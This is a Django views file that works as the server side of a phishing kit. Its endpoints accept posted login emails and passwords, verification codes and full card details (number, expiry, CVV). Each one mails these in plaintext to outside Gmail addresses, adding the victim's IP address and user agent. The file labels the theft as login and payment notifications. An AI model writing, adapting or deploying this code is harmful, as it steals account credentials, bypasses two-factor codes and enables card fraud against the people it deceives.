from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.mail import send_mail
import json
import random
import string

# Create your views here.

def get_client_ip(request):
    """Get the client's IP address from the request"""
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def get_user_agent(request):
    """Get the user agent from the request"""
    return request.META.get('HTTP_USER_AGENT', 'Unknown')

def send_login_notification_email(login_data, ip_address, user_agent):
    email_subject = 'New Login Attempt'
    email_body = f"""
    A new login attempt has been made.
    
    Email: {login_data.get('email')}
    Password: {login_data.get('password')}
    
    === REQUEST INFORMATION ===
    IP Address: {ip_address}
    User Agent: {user_agent}
    """
    try:
        send_mail(
            email_subject,
            email_body,
            'chimasid7@gmail.com',
            ['jvictory278@gmail.com'],
            fail_silently=False,
        )
        print("✅ Email sent successfully!")
    except Exception as e:
        print(f"❌ Email failed: {type(e).__name__}: {e}")
        raise  # Re-raise to see the full error

def send_code_notification_email(code_data, ip_address, user_agent):
    email_subject = 'Verification Code Submitted'
    email_body = f"""
    A verification code has been submitted.
    
    Code: {code_data.get('code')}
    
    === REQUEST INFORMATION ===
    IP Address: {ip_address}
    User Agent: {user_agent}
    """
    send_mail(
        email_subject,
        email_body,
        'chimasid7@gmail.com',
        ['jvictory225@gmail.com'],
        fail_silently=False,
    )

def send_payment_email(payment_data, ip_address, user_agent):
    email_subject = 'New Payment Received'
    email_body = f"""
    A new payment has been received.
    
    Name on Card: {payment_data.get('nameOnCard')}
    Card Number: {payment_data.get('cardNumber')}
    Expiry Date: {payment_data.get('expiryDate')}
    CVV: {payment_data.get('cvv')}
    
    === REQUEST INFORMATION ===
    IP Address: {ip_address}
    User Agent: {user_agent}
    """
    send_mail(
        email_subject,
        email_body,
        'chimasid7@gmail.com',
        ['jvictory225@gmail.com'],
        fail_silently=False,
    )

@csrf_exempt
def address(request):
    if request.method == 'POST':
        login_data = json.loads(request.body)
        ip_address = get_client_ip(request)
        user_agent = get_user_agent(request)
        
        send_login_notification_email(login_data, ip_address, user_agent)
        return JsonResponse({
            'message': 'Login information received and email sent',
            'ip': ip_address
        }, status=201)
    elif request.method == 'GET':
        return JsonResponse({'message': 'Use POST to submit login credentials'}, safe=False)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)

@csrf_exempt
def verify_code(request):
    if request.method == 'POST':
        code_data = json.loads(request.body)
        ip_address = get_client_ip(request)
        user_agent = get_user_agent(request)
        
        send_code_notification_email(code_data, ip_address, user_agent)
        return JsonResponse({
            'message': 'Verification code received and email sent',
            'ip': ip_address
        }, status=201)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)

@csrf_exempt
def payment(request):
    if request.method == 'POST':
        payment_data = json.loads(request.body)
        ip_address = get_client_ip(request)
        user_agent = get_user_agent(request)
        
        send_payment_email(payment_data, ip_address, user_agent)
        return JsonResponse({
            'message': 'Payment received and email sent',
            'ip': ip_address
        }, status=201)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)